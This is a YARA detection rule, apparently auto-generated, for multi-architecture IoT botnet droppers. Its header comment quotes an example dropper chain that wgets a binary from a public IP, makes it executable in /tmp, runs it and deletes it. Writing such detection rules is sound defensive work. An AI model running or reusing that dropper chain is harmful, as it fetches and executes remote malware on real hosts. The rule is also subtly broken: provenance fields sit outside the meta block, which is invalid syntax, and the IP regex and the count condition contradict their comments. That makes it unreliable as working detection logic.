rule rule_003_Malicious_Multi_Architecture_Botnet_Dropper {
    /*
     * Detects botnet droppers that download architecture-specific
     * payloads, execute them, and clean up evidence.
     *
     * Example match:
     *   wget http://213.209.143.64/mipst
     *   chmod +x /tmp/mipst
     *   /bin/sh /tmp/mipst aflte
     *   rm -rf /tmp/mipst
     */
    meta:
        description = "Multi-architecture botnet dropper with cleanup routine"
        severity = "High"
        confidence = "0.85"
        mitre_technique = "T1105"
        author = "Script Sentinel"

    // Provenance (auto-generated, do not edit)
    generated_by = "sentinel-generate"
    generated_at = "2025-12-28"
    source_scripts = "2cc7a00b8a44c675"
    approved_by = "Script Sentinel Team"
    approved_at = "2025-12-28"
    strings:
        // Download commands
        $dl1 = "wget http://" nocase
        $dl2 = "curl http://" nocase
        
        // Architecture-specific binary patterns (common in IoT botnets)
        $arch1 = /\/[a-z]{3,6}[st]$/ nocase  // matches /mipst, /mpsl, etc.
        $arch2 = /\/[a-z]{2,4}[0-9]{1,2}$/ nocase  // matches /arm7, /x86, etc.
        
        // Execution in /tmp (suspicious location)
        $tmp1 = "cd /tmp" nocase
        $tmp2 = "chmod +x /tmp/" nocase
        $tmp3 = "/bin/sh /tmp/" nocase
        
        // Cleanup evidence
        $clean1 = "rm -rf /tmp/" nocase
        $clean2 = "rm /tmp/" nocase
        
        // Suspicious IP patterns (non-RFC1918 addresses)
        $ip = /[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/ nocase

    condition:
        any of ($dl*) and 
        (any of ($arch*) or 2 of ($tmp*)) and 
        any of ($clean*) and 
        $ip and
        #tmp1 >= 1 and #clean1 >= 2  // Multiple downloads and cleanups
}